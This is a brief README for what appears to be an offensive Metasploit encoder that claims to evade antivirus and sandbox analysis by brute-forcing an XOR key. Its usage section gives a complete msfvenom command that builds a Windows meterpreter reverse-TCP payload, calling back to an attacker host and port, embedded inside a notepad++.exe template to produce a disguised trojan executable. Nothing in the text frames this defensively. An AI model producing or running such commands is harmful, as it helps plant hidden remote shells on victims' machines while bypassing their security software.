# Encrypter-Metasploit

This tool permit to evade any antivirus products.
It use a brute force attack on a known plain text to bypass the sandbox.


Installation
-----------

Copy bf_xor.rb in metasploit/modules/encoders/x86/

Usage
-----------

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=7777 -f raw -x notepad++.exe -f exe-only -e x86/bf_xor -o output.exe
